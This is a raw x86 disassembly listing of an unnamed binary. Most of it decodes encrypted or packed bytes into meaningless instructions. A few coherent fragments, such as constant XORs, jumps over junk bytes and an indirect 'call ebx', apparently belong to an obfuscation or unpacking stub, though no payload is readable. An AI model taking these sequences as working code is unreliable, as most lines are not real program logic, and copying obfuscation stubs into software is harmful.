  40d6d1:	in     al,0x70
  40d6d3:	bt     DWORD PTR [edi-0x56],esp
  40d6d7:	test   BYTE PTR [ebx],dl
  40d6d9:	jl     0x40d69e
  40d6db:	dec    esp
  40d6dc:	sbb    ebx,DWORD PTR [eax-0x5498cf98]
  40d6e2:	cmc    
  40d6e3:	test   DWORD PTR [ecx-0x33],0x74c9199
  40d6ea:	pop    es
  40d6eb:	inc    edi
  40d6ec:	xor    BYTE PTR [eax+0x44d53c4a],bh
  40d6f2:	out    0xc,al
  40d6f4:	call   FWORD PTR [edi]
  40d6f6:	inc    esi
  40d6f7:	xor    edx,ecx
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	jl     0x40d72a
  40d73e:	push   ebx
  40d73f:	bound  eax,QWORD PTR [ecx]
  40d741:	cmp    BYTE PTR [esi+0x7e],0x3f
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d6c9
  40d749:	bound  esi,QWORD PTR [edx+ebp*1-0x65e6c71e]
  40d750:	sub    esp,0x4168d5c
  40d756:	call   0xe758:0xd02d1caa
  40d75d:	fimul  DWORD PTR [ecx+ebp*2+0x56]
  40d761:	xor    bl,0x7b
  40d764:	fwait
  40d765:	add    DWORD PTR [ecx],eax
  40d767:	cli    
  40d768:	cld    
  40d769:	gs mov ch,bl
  40d76c:	jle    0x40d7d2
  40d76e:	inc    ebx
  40d76f:	mov    bh,BYTE PTR [esi+0x258d82ae]
  40d775:	mov    bl,ah
  40d777:	into   
  40d778:	push   0xffffff9c
  40d77a:	sub    ch,BYTE PTR [eax-0x3f]
  40d77d:	hlt    
  40d77e:	aaa    
  40d77f:	adc    BYTE PTR [ebx],bh
  40d781:	sub    al,0xcf
  40d783:	jno    0x40d72e
  40d785:	sahf   
  40d786:	pop    edx
  40d787:	push   cs
  40d788:	dec    edx
  40d789:	scas   eax,DWORD PTR es:[edi]
  40d78a:	xor    al,0x97
  40d78c:	out    0xd,eax
  40d78e:	dec    esp
  40d78f:	pop    ds
  40d790:	cwde   
  40d791:	jnp    0x40d7e6
  40d793:	pop    eax
  40d794:	dec    esi
  40d795:	pop    es
  40d796:	mov    eax,0x5cf9a7b9
  40d79b:	ret    0x5d57
  40d79e:	adc    BYTE PTR [esi],ah
  40d7a0:	scas   al,BYTE PTR es:[edi]
  40d7a1:	rol    BYTE PTR [ecx],cl
  40d7a3:	push   0x45
  40d7a5:	mov    al,ds:0x137d7d5
  40d7aa:	jne    0x40d7c3
  40d7ac:	aaa    
  40d7ad:	mov    bl,0x3c
  40d7af:	lods   eax,DWORD PTR ds:[esi]
  40d7b0:	cld    
  40d7b1:	retf   0x20c4
  40d7b4:	les    ecx,FWORD PTR [ebx]
  40d7b6:	mov    al,ds:0x370d1d2b
  40d7bb:	fcom   QWORD PTR [edi-0x22]
  40d7be:	inc    edx
  40d7bf:	imul   ebp,DWORD PTR [ebp+0x76e9758a],0x55e26124
  40d7c9:	es leave 
  40d7cb:	ret    
  40d7cc:	jb     0x40d7da
  40d7ce:	inc    esp
  40d7cf:	adc    al,0xe2
  40d7d1:	mov    edi,0x203ce540
  40d7d6:	std    
  40d7d7:	pop    edx
  40d7d8:	lock add ah,BYTE PTR [ecx+0x5d]
  40d7dc:	shl    BYTE PTR [ecx],1
  40d7de:	out    0x2e,eax
  40d7e0:	ret    0xc476
  40d7e3:	push   eax
  40d7e4:	(bad)  
  40d7e5:	fwait
  40d7e6:	test   BYTE PTR [ebp+ebp*8+0x768fb066],al
  40d7ed:	xchg   edi,eax
  40d7ee:	in     al,0x42
  40d7f0:	cs ss out dx,eax
  40d7f3:	cmp    bh,BYTE PTR [esp+ebx*1-0x22d07eef]
  40d7fa:	xchg   ebp,eax
  40d7fb:	or     al,0x5f
  40d7fd:	dec    ecx
  40d7fe:	bound  edx,QWORD PTR [edx-0x1b07126d]
  40d804:	xor    DWORD PTR [edx],0x4ab99ac1
  40d80a:	and    eax,0xc477f253
  40d80f:	pop    edi
  40d810:	imul   edx,ebp,0x7f
  40d813:	jmp    0xf52cffe5
  40d818:	adc    BYTE PTR [edi],cl
  40d81a:	xchg   bh,ah
  40d81c:	xor    eax,0xc1eff2a8
  40d821:	test   al,0xdb
  40d823:	pop    esi
  40d824:	je     0x40d84d
  40d826:	in     eax,0x68
  40d828:	cdq    
  40d829:	jl     0x40d878
  40d82b:	cmp    al,0xfa
  40d82d:	inc    ebp
  40d82e:	jmp    FWORD PTR [eax]
  40d830:	mov    edx,0x113af56c
  40d835:	lods   al,BYTE PTR ds:[esi]
  40d836:	int    0x79
  40d838:	and    ecx,ebp
  40d83a:	sar    DWORD PTR gs:[eax+0x72363ad6],1
  40d841:	push   edi
  40d842:	xchg   esi,eax
  40d843:	and    BYTE PTR [esi],cl
  40d845:	jo     0x40d7f8
  40d847:	sti    
  40d848:	sbb    al,0x47
  40d84a:	pop    esp
  40d84b:	imul   ecx,edx,0xd3338d22
  40d851:	fdiv   QWORD PTR [ebp-0xbf64b72]
  40d857:	lahf   
  40d858:	add    eax,DWORD PTR [edx-0x12]
  40d85b:	repnz add DWORD PTR [ebx-0x2d5dc8f2],ecx
  40d862:	xchg   esp,eax
  40d863:	cmp    esi,ebx
  40d865:	stos   BYTE PTR es:[edi],al
  40d866:	add    DWORD PTR [esi-0x30c0eccd],eax
  40d86c:	ret    
  40d86d:	pop    ebx
  40d86e:	cli    
  40d86f:	fidiv  DWORD PTR [esi]
  40d871:	out    0xd6,al
  40d873:	and    dh,ah
  40d875:	mov    DWORD PTR [edx-0x16],esp
  40d878:	lods   eax,DWORD PTR ds:[esi]
  40d879:	xchg   ebp,eax
  40d87a:	je     0x40d89b
  40d87c:	adc    ch,dl
  40d87e:	(bad)  
  40d87f:	cmp    DWORD PTR [eax],ecx
  40d881:	fdivp  st(0),st
  40d883:	pop    ds
  40d884:	mov    al,BYTE PTR [ebx+0x5f]
  40d887:	outs   dx,BYTE PTR ds:[esi]
  40d888:	push   eax
  40d889:	call   ebx
  40d88b:	xor    ebx,ebx
  40d88d:	jmp    0x40d9eb
  40d892:	mul    BYTE PTR [ebx-0x6c]
  40d895:	jne    0x40d914
  40d897:	lds    edx,FWORD PTR [edi+0x51026b7d]
  40d89d:	mov    edx,DWORD PTR [eax-0x3d]
  40d8a0:	pop    edx
  40d8a1:	cmp    eax,edx
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ab:	xchg   esi,eax
  40d8ac:	ss cmp al,0x28
  40d8af:	mov    bl,BYTE PTR [esi+0x24]
  40d8b2:	arpl   WORD PTR [ecx],ax
  40d8b4:	loope  0x40d88e
  40d8b6:	pushw  ds
  40d8b8:	dec    edx
  40d8b9:	aam    0xa9
  40d8bb:	jo     0x40d937
  40d8bd:	pop    ecx
  40d8be:	xchg   ebx,eax
  40d8bf:	enter  0xaa18,0xb
  40d8c3:	cdq    
  40d8c4:	shl    BYTE PTR [eax],cl
  40d8c6:	mov    esp,0xc5dc4a44
  40d8cb:	das    
  40d8cc:	popa   
  40d8cd:	pop    esp
  40d8ce:	enter  0x9e60,0x93
  40d8d2:	sub    ch,BYTE PTR [esi-0x15]
  40d8d5:	dec    ebp
  40d8d6:	mul    bl
  40d8d8:	jns    0x40d8e6
  40d8da:	ja     0x40d861
  40d8dc:	movaps xmm0,XMMWORD PTR [eax+0x16]
  40d8e0:	add    eax,0xb82129e3
  40d8e5:	inc    esp
  40d8e6:	in     eax,0xd8
  40d8e8:	fwait
  40d8e9:	mov    ds:0xefbbadc0,al
  40d8ee:	bound  edx,QWORD PTR fs:[edi-0x10d7da]
  40d8f5:	jecxz  0x40d8d7
  40d8f7:	aas    
  40d8f8:	ins    BYTE PTR es:[edi],dx
  40d8f9:	mov    ch,0xdd
  40d8fb:	push   es
  40d8fc:	out    0x7f,eax
  40d8fe:	out    0x64,eax
  40d900:	push   ecx
  40d901:	adc    al,BYTE PTR [edi-0x3aaa26b5]
  40d907:	sub    DWORD PTR [edi+0x266c8b42],0x79
  40d90e:	jp     0x40d8ea
  40d910:	pushf  
  40d911:	xor    BYTE PTR [ebp-0x57b9b2f9],ch
  40d917:	jno    0x40d8cc
  40d919:	mov    edx,0x6d8fc283
  40d91e:	jae    0x40d8a3
  40d920:	loop   0x40d8b8
  40d922:	xor    DWORD PTR [ebx+0x20ebd8a8],0x2a
  40d929:	push   eax
  40d92a:	(bad)  
  40d92b:	adc    al,0xe7
  40d92d:	gs (bad) 
  40d930:	int3   
  40d931:	loopne 0x40d8e0
  40d933:	sub    eax,0x29c4bd38
  40d938:	(bad)  
  40d939:	out    dx,al
  40d93a:	or     al,0xe0
  40d93c:	sysret 
  40d93e:	in     eax,dx
  40d93f:	sub    edi,DWORD PTR [ecx-0xb]
  40d942:	lods   al,BYTE PTR ds:[esi]
  40d943:	mov    cl,0x34
  40d945:	mov    al,ds:0x92cd6c30
  40d94a:	xchg   edi,eax
  40d94b:	jb     0x40d94a
  40d94d:	dec    eax
  40d94e:	adc    eax,0x47f5d7f2
  40d953:	sti    
  40d954:	dec    esi
  40d955:	je     0x40d915
  40d957:	mov    edx,ebp
  40d959:	pop    ds
  40d95a:	fbstp  TBYTE PTR [edi-0x27]
  40d95d:	jno    0x40d929
  40d95f:	fcmovnb st,st(0)
  40d961:	leave  
  40d962:	sbb    DWORD PTR [eax+0x50],esi
  40d965:	bound  ebp,QWORD PTR [edi-0x16fb2c94]
  40d96b:	fadd   QWORD PTR [ebp+0x13]
  40d96e:	pop    ss
  40d96f:	neg    DWORD PTR ss:[ebp+0xd1cfb28]
  40d976:	or     eax,0x138f05c1
  40d97b:	add    DWORD PTR [eax],esi
  40d97d:	pop    esi
  40d97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d97f:	shl    BYTE PTR [ebx+eiz*1-0xe2515eb],1
  40d986:	mov    ebx,0x67ec6d65
  40d98b:	mov    esi,0x18c0cab9
  40d990:	sar    BYTE PTR [edx+0x546b92c3],cl
  40d996:	loopne 0x40d9d8
  40d998:	or     dl,BYTE PTR [ecx]
  40d99a:	leave  
  40d99b:	mov    dh,0x5d
  40d99d:	adc    al,0xf
  40d99f:	mov    dh,0x1a
  40d9a1:	add    al,0x26
  40d9a3:	test   esi,edx
  40d9a5:	inc    edi
  40d9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a7:	int    0xbf
  40d9a9:	(bad)  
  40d9aa:	out    0x66,eax
  40d9ac:	mov    esp,0x3acab226
  40d9b1:	das    
  40d9b2:	inc    BYTE PTR ds:0x7e9cd78c
  40d9b8:	add    edi,DWORD PTR [ecx+0x15234840]
  40d9be:	mov    ebp,0x164a6272
  40d9c3:	(bad)  
  40d9c4:	pop    ds
  40d9c5:	inc    edi
  40d9c6:	jecxz  0x40d9ff
  40d9c8:	test   DWORD PTR [ebx*2-0x4b8fc7de],eax
  40d9cf:	xchg   esi,eax
  40d9d0:	pop    edi
  40d9d1:	clc    
  40d9d2:	adc    ah,BYTE PTR [edx+0x330bdf9e]
  40d9d8:	jl     0x40d98d
  40d9da:	xchg   esi,eax
  40d9db:	out    dx,al
  40d9dc:	inc    edi
  40d9dd:	out    dx,al
  40d9de:	(bad)  
  40d9df:	or     DWORD PTR [ebx],edx
  40d9e1:	aad    0x1a
  40d9e3:	pand   mm0,QWORD PTR [eax+0x61]
  40d9e7:	fsubr  st(2),st
  40d9e9:	add    esp,DWORD PTR [ebx]
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	sti    
  40d9fe:	ret    
  40d9ff:	addr16 sub eax,0x7e7e8283
  40da05:	aas    
  40da06:	jg     0x40da86
  40da08:	jle    0x40da19
  40da0a:	lock adc DWORD PTR [edi-0x710cc151],esp
  40da11:	pop    edi
  40da12:	xchg   ecx,eax
  40da13:	inc    ebx
  40da14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da15:	pop    ss
  40da16:	fidivr DWORD PTR [esi-0x66]
  40da19:	jmp    0xb476:0x8bbcd1c3
  40da20:	add    BYTE PTR [eax],cl
  40da22:	jp     0x40da2f
  40da24:	adc    eax,0x52606583
  40da29:	frstor [ecx+0xfaae8f6]
  40da2f:	scas   eax,DWORD PTR es:[edi]
  40da30:	sbb    BYTE PTR [edx+0x531b252b],bl
  40da36:	mov    bh,0x9b
  40da38:	or     ebp,ebp
  40da3a:	leave  
  40da3b:	adc    ch,BYTE PTR [ebx]
  40da3d:	push   ecx
  40da3e:	ffree  st(1)
  40da40:	inc    edx
  40da41:	cmp    eax,DWORD PTR [ebx+ebp*8]
  40da44:	hlt    
  40da45:	pop    es
  40da46:	(bad)  
  40da47:	jmp    0x40daa3
  40da49:	fcomp  DWORD PTR [ebx+esi*2]
  40da4c:	mov    al,ds:0x84d38d5d
  40da51:	dec    esi
  40da52:	cmp    eax,0x161deba9
  40da57:	push   ebx
  40da58:	stos   DWORD PTR es:[edi],eax
  40da59:	push   ss
  40da5a:	jge    0x40da2a
  40da5c:	mov    edx,edi
  40da5e:	ss pop ds
  40da60:	loope  0x40d9e2
  40da62:	ss push esp
  40da64:	add    bh,dh
  40da66:	or     BYTE PTR [edx-0x3af27979],ah
  40da6c:	loop   0x40da93
  40da6e:	and    ebp,DWORD PTR [ecx+eiz*2-0x6a873aac]
  40da75:	adc    al,0x4e
  40da77:	mov    ah,ch
  40da79:	fstp   DWORD PTR [eax]
  40da7b:	addr16 repz hlt 
  40da7e:	fstp   QWORD PTR [ecx-0x46]
  40da81:	fs dec ebp
  40da83:	mov    esi,0xde08ddbd
  40da88:	add    al,0xf2
  40da8a:	int3   
  40da8b:	pop    eax
  40da8c:	sbb    eax,0x317ec0d7
  40da91:	ins    DWORD PTR es:[edi],dx
  40da92:	sbb    al,0xe0
  40da94:	data16 clc 
  40da96:	sub    eax,0x32a28edd
  40da9b:	dec    esp
  40da9c:	xchg   ecx,eax
  40da9d:	aas    
  40da9e:	cmp    al,0xee
  40daa0:	mov    dh,0x94
  40daa2:	nop
  40daa3:	aaa    
  40daa4:	mov    ecx,0x7ead031
  40daa9:	dec    esi
  40daaa:	std    
  40daab:	jecxz  0x40db24
  40daad:	mov    ds:0xde3cf0bb,al
  40dab2:	mov    dl,0x6e
  40dab4:	push   0x19
  40dab6:	xchg   BYTE PTR [edi-0x633d0a56],ah
  40dabc:	(bad)  
  40dabd:	sti    
  40dabe:	jb     0x40da89
  40dac0:	xchg   esi,eax
  40dac1:	hlt    
  40dac2:	sbb    ebp,DWORD PTR [edi]
  40dac4:	stc    
  40dac5:	out    0xbe,eax
  40dac7:	inc    edi
  40dac8:	mov    ch,0xdf
  40daca:	fld    QWORD PTR [edx]
  40dacc:	mov    dh,0xeb
  40dace:	das    
  40dacf:	sub    BYTE PTR ss:[ecx-0x47aa75aa],dl
  40dad6:	push   ds
  40dad7:	aam    0x3a
  40dad9:	xchg   DWORD PTR [edi-0x4264884a],edx
  40dadf:	rcl    DWORD PTR [eax],cl
  40dae1:	push   cs
  40dae2:	(bad)  
  40dae3:	or     eax,0xbf2cefc6
  40dae8:	push   ecx
  40dae9:	in     al,dx
  40daea:	pop    es
  40daeb:	bsr    eax,DWORD PTR [edx+ecx*2+0x66]
  40daf0:	mov    esi,0x1f210cc
  40daf5:	mov    esi,0x9582f7e9
  40dafa:	xchg   esp,eax
  40dafb:	jge    0x40db55
  40dafd:	push   cs
  40dafe:	push   es
  40daff:	frstor [ecx+0x44]
  40db02:	je     0x40db57
  40db04:	test   al,0xc9
  40db06:	push   ds
  40db07:	loope  0x40dac0
  40db09:	scas   al,BYTE PTR es:[edi]
  40db0a:	adc    edx,DWORD PTR [eax]
  40db0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db0d:	push   ecx
  40db0e:	jge    0x40db62
  40db10:	pop    ds
  40db11:	xchg   ecx,eax
  40db12:	add    DWORD PTR [ebp-0x3],ebp
  40db15:	and    BYTE PTR [esi],0x1e
  40db18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db19:	call   0x71cb9599
  40db1e:	cmp    eax,0x2f77d1fc
  40db23:	sbb    ch,BYTE PTR [esp+ecx*4]
  40db26:	and    eax,0xae87e74f
  40db2b:	out    0x5a,al
  40db2d:	js     0x40db55
  40db2f:	call   FWORD PTR ds:0x89c4747c
  40db35:	sbb    BYTE PTR [edx+ebx*4+0x36cbd298],dh
  40db3c:	lods   eax,DWORD PTR ds:[esi]
  40db3d:	mov    edx,ebp
  40db3f:	daa    
  40db40:	dec    edi
  40db41:	jbe    0x40dafe
  40db43:	enter  0x3f8e,0x9
  40db47:	mov    ds:0x5d39967a,eax
  40db4c:	adc    BYTE PTR [edi],cl
  40db4e:	test   BYTE PTR [edx],dh
  40db50:	add    al,0x0
  40db52:	add    cl,ch
  40db54:	pop    ecx
  40db55:	add    DWORD PTR [eax],eax
  40db57:	add    BYTE PTR [ebp-0x54e36178],dl
  40db5d:	cmp    al,0xbd
  40db5f:	mov    ecx,0xd105ab5
  40db64:	stc    
  40db65:	and    ch,al
  40db67:	loope  0x40dbad
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dba1
  40db71:	and    DWORD PTR [ebx-0x105a8aef],0x22359b8f
  40db7b:	out    0xce,eax
  40db7d:	push   es
  40db7e:	jecxz  0x40db33
  40db80:	mov    ah,0x2
  40db82:	dec    edi
  40db83:	cmc    
  40db84:	aam    0xab
  40db86:	in     eax,dx
  40db87:	push   ebp
  40db88:	push   cs
  40db89:	icebp  
  40db8a:	mov    al,0x50
  40db8c:	call   DWORD PTR [edi-0x356a4df]
  40db92:	xchg   esi,eax
  40db93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db94:	jne    0x40db8e
  40db96:	cli    
  40db97:	jns    0x40db86
  40db99:	popa   
  40db9a:	shl    BYTE PTR [ebx+0x331b93e6],cl
  40dba0:	mov    ebx,0xdb932c1f
  40dba5:	div    BYTE PTR [eax-0x6569295b]
  40dbab:	retf   
  40dbac:	pop    edi
  40dbad:	inc    esi
  40dbae:	daa    
  40dbaf:	pop    ecx
  40dbb0:	test   DWORD PTR [esi-0x5a0f0991],0x6cff8cba
  40dbba:	inc    esi
  40dbbb:	clc    
  40dbbc:	mov    edi,0x44d9eea
  40dbc1:	xchg   ecx,eax
  40dbc2:	aad    0x6a
  40dbc4:	mov    edx,0xf6a2393b
  40dbc9:	or     al,0xd6
  40dbcb:	and    BYTE PTR ds:0xc6531d0b,bl
  40dbd1:	bound  ebx,QWORD PTR fs:[ebx-0x6a]
  40dbd5:	pushf  
  40dbd6:	dec    esi
  40dbd7:	inc    ebx
  40dbd8:	mov    ecx,0x8ef7e902
  40dbdd:	ins    BYTE PTR es:[edi],dx
  40dbde:	cmp    edi,DWORD PTR [ebx+0x239f535c]
  40dbe4:	sbb    eax,esi
  40dbe6:	test   BYTE PTR [eax+0x2bf6d2d1],cl
  40dbec:	jp     0x40dc6a
  40dbee:	sbb    DWORD PTR [ebp-0x7f7c8a70],esp
  40dbf4:	stos   BYTE PTR es:[edi],al
  40dbf5:	sbb    al,0xc3
  40dbf7:	mov    DWORD PTR [ebp+0x66],0x70daf0c9
  40dbfe:	mov    edx,0x6d4727cc
  40dc03:	fcomp  QWORD PTR [esi-0x31161ef2]
  40dc09:	sar    BYTE PTR [esi-0x4fc9c5b9],cl
  40dc0f:	push   es
  40dc10:	lahf   
  40dc11:	jecxz  0x40dbfe
  40dc13:	retf   
  40dc14:	mov    bh,0x8a
  40dc16:	xor    eax,0x1c6ac53d
  40dc1b:	or     dh,dh
  40dc1d:	mov    ds:0x7872bde4,al
  40dc22:	push   esi
  40dc23:	call   0xe985:0x5c1fb2b6
  40dc2a:	(bad)  
  40dc2b:	fmul   DWORD PTR [eax+0x7c]
  40dc2e:	test   DWORD PTR [edi],edx
  40dc30:	fidiv  WORD PTR [ecx-0x435df0a7]
  40dc36:	shl    BYTE PTR [esi],cl
  40dc38:	pop    ebp
  40dc39:	add    al,0xd3
  40dc3b:	dec    edx
  40dc3c:	test   dh,0x3f
  40dc3f:	scas   eax,DWORD PTR es:[edi]
  40dc40:	pop    edi
  40dc41:	test   BYTE PTR [edx+edi*2],0xce
  40dc45:	gs (bad) 
  40dc47:	call   0x1ed1a34d
  40dc4c:	mov    BYTE PTR [esp+eiz*8],0xe4
  40dc50:	mov    dl,0x61
  40dc52:	rep stos DWORD PTR es:[edi],eax
  40dc54:	test   BYTE PTR [ecx],al
  40dc56:	not    DWORD PTR [esi]
  40dc58:	cli    
  40dc59:	adc    al,0x47
  40dc5b:	hlt    
  40dc5c:	jmp    0xda64:0xb6a89b8b
  40dc63:	jmp    DWORD PTR [ebx]
  40dc65:	dec    ebx
  40dc66:	pop    eax
  40dc67:	sti    
  40dc68:	xor    al,0x5a
  40dc6a:	ret    
  40dc6b:	test   BYTE PTR [esi-0x3a],dl
  40dc6e:	popf   
  40dc6f:	pop    ebx
  40dc70:	jg     0x40dc5a
  40dc72:	dec    eax
  40dc73:	push   edx
  40dc74:	ret    0x45cd
  40dc77:	and    DWORD PTR [edx],edi
  40dc79:	mov    esi,ss
  40dc7b:	inc    edi
  40dc7c:	cdq    
  40dc7d:	cld    
  40dc7e:	or     bh,cl
  40dc80:	nop    esp
  40dc83:	js     0x40dc85
  40dc85:	xchg   DWORD PTR [edx-0x422a391e],esi
  40dc8b:	or     BYTE PTR [esi+0xe],ch
  40dc8e:	xor    al,0x9b
  40dc90:	pop    esp
  40dc91:	dec    ebp
  40dc92:	pop    ebx
  40dc93:	rol    DWORD PTR [edi],cl
  40dc95:	(bad)  
  40dc96:	dec    ecx
  40dc97:	xchg   edx,eax
  40dc98:	push   esp
  40dc99:	ret    
  40dc9a:	mov    bl,0x8c
  40dc9c:	retf   0xcc40
  40dc9f:	lahf   
  40dca0:	(bad)  
  40dca1:	and    BYTE PTR [edx],ah
  40dca3:	push   0xb31549da
  40dca8:	aas    
  40dca9:	retf   0x99b1
  40dcac:	mov    esi,0x68cf35b4
  40dcb1:	xchg   edx,eax
  40dcb2:	jmp    0x40de10
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0xb80d3fe9,cl
  40dcc5:	in     eax,0x54
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dca3
  40dcd0:	pop    ss
  40dcd1:	cli    
  40dcd2:	call   0x1254:0x9f6139df
  40dcd9:	push   esi
  40dcda:	lock in eax,0xa
  40dcdd:	clc    
  40dcde:	mov    ds:0x95745d59,al
  40dce3:	cld    
  40dce4:	out    0xc8,al
  40dce6:	jmp    0x5dc7:0x8cdeda99
  40dced:	inc    ebx
  40dcee:	fistp  WORD PTR [edi-0x6a]
  40dcf1:	cmp    DWORD PTR [eax-0x49],ebp
  40dcf4:	jl     0x40dd69
  40dcf6:	in     al,dx
  40dcf7:	ja     0x40dc9a
  40dcf9:	sahf   
  40dcfa:	push   ss
  40dcfb:	fst    st(7)
  40dcfd:	les    ebp,FWORD PTR [ebx]
  40dcff:	push   eax
  40dd00:	sub    edx,edx
  40dd02:	retf   0x3df1
  40dd05:	xchg   ecx,eax
  40dd06:	sub    eax,DWORD PTR [esi]
  40dd08:	lods   al,BYTE PTR ds:[esi]
  40dd09:	fistp  QWORD PTR [ecx]
  40dd0b:	sub    edi,DWORD PTR [edi+eiz*4-0x55ace111]
  40dd12:	jp     0x40dcb4
  40dd14:	rol    esi,0x2c
  40dd17:	push   ecx
  40dd18:	in     eax,dx
  40dd19:	inc    ebx
  40dd1a:	push   esp
  40dd1b:	and    DWORD PTR [ebp-0x634ede19],esp
  40dd21:	cmp    ebx,DWORD PTR [ebx]
  40dd23:	or     DWORD PTR [ebx+0x6b],edx
  40dd26:	inc    DWORD PTR [ecx]
  40dd28:	ja     0x40dd09
  40dd2a:	daa    
  40dd2b:	mov    edi,0xcbcf8e2e
  40dd30:	xor    DWORD PTR [ecx-0x1a8aa6ee],0x22
  40dd37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd38:	mov    al,ds:0xa70b44b1
  40dd3d:	xchg   ecx,eax
  40dd3e:	sbb    BYTE PTR [edx+eiz*1],cl
  40dd41:	mov    ds:0x37f80f64,eax
  40dd46:	fnsave [edx]
  40dd48:	pop    ecx
  40dd49:	shl    DWORD PTR [ebx],cl
  40dd4b:	enter  0xf5b6,0x60
  40dd4f:	(bad)  
  40dd50:	cld    
  40dd51:	loope  0x40dce9
  40dd53:	out    0x9e,al
  40dd55:	xor    BYTE PTR [edx+0x7e75eed2],bl
  40dd5b:	sar    DWORD PTR [edx-0x551007cb],1
  40dd61:	pop    ecx
  40dd62:	xchg   edx,eax
  40dd63:	loop   0x40dd64
  40dd65:	mov    ds:0x71076658,al
  40dd6a:	popa   
  40dd6b:	out    dx,eax
  40dd6c:	(bad)  
  40dd6d:	sar    DWORD PTR [edx+0x36],0xf4
  40dd71:	or     esi,0x50
  40dd74:	mov    edx,0xf0763b43
  40dd79:	pop    ecx
  40dd7b:	mov    ch,BYTE PTR [edx-0xc]
  40dd7e:	mov    eax,ds:0x33525305
  40dd83:	into   
  40dd84:	pop    ds
  40dd85:	int3   
  40dd86:	fs and eax,0x3d5dc980
  40dd8c:	pusha  
  40dd8d:	mov    eax,DWORD PTR [ecx+0x21]
  40dd90:	push   es
  40dd91:	push   ecx
  40dd93:	and    al,0x33
  40dd95:	pusha  
  40dd96:	mov    eax,ds:0x5741d7e6
  40dd9b:	jns    0x40ddb2
  40dd9d:	mov    dl,BYTE PTR [eax]
  40dd9f:	sbb    eax,0x74cb7891
  40dda4:	rcl    BYTE PTR [ebp+0x7576085c],0x68
  40ddab:	outs   dx,BYTE PTR ds:[esi]
  40ddac:	(bad)  
  40ddad:	fdivr  QWORD PTR [eax+0x50]
  40ddb0:	stos   DWORD PTR es:[edi],eax
  40ddb1:	and    eax,0x88e21fdf
  40ddb6:	cmc    
  40ddb7:	aas    
  40ddb8:	mov    ebx,0x1d1cf678
  40ddbd:	scas   eax,DWORD PTR es:[edi]
  40ddbe:	aam    0x24
  40ddc0:	clc    
  40ddc1:	xchg   esi,eax
  40ddc2:	xor    al,0x8a
  40ddc4:	fst    QWORD PTR [ecx+edx*1+0x5]
  40ddc8:	in     al,0x67
  40ddca:	push   ecx
  40ddcb:	mov    esp,0xc3d5f1e9
  40ddd0:	and    eax,0x142a8074
  40ddd5:	ja     0x40ddfb
  40ddd7:	push   eax
  40ddd8:	addr16 dec ebx
  40ddda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dddb:	inc    ecx
  40dddc:	addr16 test al,0x78
  40dddf:	cmp    BYTE PTR [esi+0x2de60f26],0x79
  40dde6:	xor    al,0xaf
  40dde8:	aaa    
  40dde9:	jmp    0xf4ee:0x364ece90
  40ddf0:	sbb    DWORD PTR ds:0xdf8592c4,ebp
  40ddf6:	adc    al,BYTE PTR [edi-0x742a1504]
  40ddfc:	mov    ecx,0x958624bc
  40de01:	inc    esi
  40de02:	data16 xor BYTE PTR [esp+0x25d67eb2],cl
  40de0a:	stos   DWORD PTR es:[edi],eax
  40de0b:	mov    bl,0x49
  40de0d:	cmp    BYTE PTR [edx],bh
  40de0f:	or     ch,BYTE PTR [edx+0xa]
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xefc1538d
  40de2d:	retf   
  40de2e:	mov    BYTE PTR [esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40de95
  40de37:	push   0xffffffbb
  40de39:	mov    bh,0xf0
  40de3b:	sub    cl,BYTE PTR [ecx+ebp*8+0x3986395]
  40de42:	out    dx,al
  40de43:	jb     0x40de4c
  40de45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de47:	sti    
  40de48:	sbb    BYTE PTR [edi+ebx*8],al
  40de4b:	int    0xbb
  40de4d:	ins    DWORD PTR es:[edi],dx
  40de4e:	repz aad 0xaf
  40de51:	cmp    BYTE PTR [edx+eiz*2],cl
  40de54:	inc    esp
  40de55:	inc    edx
  40de56:	bound  eax,QWORD PTR [ebx-0x4e]
  40de59:	inc    ebx
  40de5a:	cwde   
  40de5b:	sub    BYTE PTR [esi-0x2b],cl
  40de5e:	add    DWORD PTR [esi+0x40],eax
  40de61:	test   al,0xbf
  40de63:	mov    ds:0xb4a3a263,eax
  40de68:	inc    ebp
